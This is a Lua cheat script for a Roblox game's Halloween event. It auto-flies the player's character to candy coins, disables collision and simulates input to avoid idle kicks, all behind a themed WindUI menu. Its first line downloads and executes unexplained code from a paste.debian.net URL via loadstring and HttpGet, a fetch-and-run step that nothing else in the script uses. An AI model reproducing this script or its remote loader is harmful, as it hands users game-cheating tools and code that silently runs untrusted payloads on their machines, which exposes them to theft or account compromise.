--[[
    FIXED!
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    🎃 AUT0FARM HALLOWEEN EVENT 2024 🎃
    ]]


loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
wait(0.5)
if not game:IsLoaded() then game.Loaded:Wait() end
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- Apply Halloween Theme with darker buttons
WindUI:AddTheme({
    Name = "Halloween", -- Halloween theme name
    
    Accent = WindUI:Gradient({                                                  
        ["0"] = { Color = Color3.fromHex("#FF7518"), Transparency = 0 },        -- Orange
        ["100"]   = { Color = Color3.fromHex("#8B4513"), Transparency = 0 },    -- Brown
    }, {                                                                        
        Rotation = 0,                                                           
    }),                                                                         
    Dialog = Color3.fromHex("#1A0F00"),      -- Dark brown
    Outline = Color3.fromHex("#0D0700"),     -- Orange outline
    Text = Color3.fromHex("#FFFFFF"),        -- White text
    Placeholder = Color3.fromHex("#7A5C34"), -- Medium brown
    Background = Color3.fromHex("#0D0700"),  -- Very dark brown/black
    Button = Color3.fromHex("#2A1A0A"),      -- Darker brown buttons (was #3D2A13)
    Icon = Color3.fromHex("#FF9518")         -- Bright orange icons
})

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

local visitedPositions = {}
local isActive = false
local flySpeed = 15
local collected = 0
local startTime = 0
local antiAFK = false

player.CharacterAdded:Connect(function(char)
    character = char
    rootPart = char:WaitForChild("HumanoidRootPart")
    visitedPositions = {}
end)

local collectSound = Instance.new("Sound", rootPart)
collectSound.SoundId = "rbxassetid://12221967"
collectSound.Volume = 1

local Window = WindUI:CreateWindow({
    Title = "Halloween Candy Autofarm",
    Icon = "coins",
    Folder = "AutoFarm",
    Theme = "Halloween",
    Background = "https://tr.rbxcdn.com/180DAY-2d85bbfdad337727a02723d3eac5b51d/768/432/Image/Webp/noFilter"
})

-- Disable topbar buttons
Window:DisableTopbarButtons({
    "Close", 
    "Fullscreen",
})

local Tab = Window:Tab({
    Title = "Auto Farm",
    Icon = "bird"
})
Tab:Select()

local counterLabel = Tab:Button({
    Title = "Candies Collected",
    Desc = "0",
    Locked = true,
    Callback = function() end
})
local timerLabel = Tab:Button({
    Title = "Time Active",
    Desc = "0s",
    Locked = true,
    Callback = function() end
})
local rateLabel = Tab:Button({
    Title = "Est. Candies/Hour",
    Desc = "0",
    Locked = true,
    Callback = function() end
})

local autofarmToggle = Tab:Toggle({
    Title = "Auto Farm",
    Desc = "Toggle autofarming",
    Default = false,
    Callback = function(state)
        isActive = state
        print("Autofarm toggle is now:", isActive)
        if isActive then
            collected = 0
            startTime = tick()
            visitedPositions = {}

            -- Timer updater
            task.spawn(function()
                while isActive do
                    local elapsed = tick() - startTime
                    timerLabel:SetDesc(tostring(math.floor(elapsed)) .. "s")
                    local rate = elapsed > 0 and math.floor((collected / elapsed) * 3600) or 0
                    rateLabel:SetDesc(tostring(rate))
                    task.wait(0.1)
                end
            end)

            -- Main autofarm loop
            task.spawn(function()
                while isActive do
                    character = player.Character or player.CharacterAdded:Wait()
                    rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        local closest, shortest = nil, math.huge
                        for _, obj in ipairs(workspace:GetDescendants()) do
                            if obj:IsA("BasePart") and obj.Name == "Coin_Server" then -- <<<< CHANGE THIS IF NEEDED!
                                local dist = (obj.Position - rootPart.Position).Magnitude
                                if dist < shortest and dist < 250 and not visitedPositions[obj] then
                                    closest = obj
                                    shortest = dist
                                end
                            end
                        end

                        if closest and closest.Parent and closest:IsDescendantOf(workspace) then
                            print("Flying to candy at:", closest.Position)
                            local distance = (closest.Position - rootPart.Position).Magnitude
                            local duration = distance / flySpeed
                            local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
                            local goal = {CFrame = CFrame.new(closest.Position)}
                            local tween = TweenService:Create(rootPart, tweenInfo, goal)
                            tween:Play()
                            tween.Completed:Wait()
                            visitedPositions[closest] = true
                            collected += 1
                            collectSound:Play()
                            counterLabel:SetDesc(tostring(collected))
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end
    end
})

Tab:Slider({
    Title = "Fly Speed",
    Desc = "Change flying speed",
    Step = 1,
    Value = {Min = 10, Max = 25, Default = 15},
    Callback = function(val)
        flySpeed = val
    end
})

Tab:Button({
    Title = "Reset Counter",
    Desc = "Resets stats",
    Callback = function()
        collected = 0
        startTime = tick()
        counterLabel:SetDesc("0")
        timerLabel:SetDesc("0s")
        rateLabel:SetDesc("0")
    end
})

Tab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents kick for inactivity",
    Default = false,
    Callback = function(state)
        antiAFK = state
    end
})

player.Idled:Connect(function()
    if antiAFK then
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end
end)

RunService.Stepped:Connect(function()
    if isActive and character then
        for _, v in ipairs(character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end
end)

local SettingsTab = Window:Tab({
    Title = "Settings",
    Icon = "settings"
})

local Keybind = SettingsTab:Keybind({
    Title = "Keybind",
    Desc = "Keybind to open ui",
    Value = "G",
    Callback = function(v)
        Window:SetToggleKey(Enum.KeyCode[v])
    end
})

Window:OnToggle(function(isOpen)
    if not isOpen then
        WindUI:Notify({
            Title = "Minimized!",
            Content = "Press G again to open the UI.",
            Duration = 3,
            Icon = "heart",
        })
    end
end)
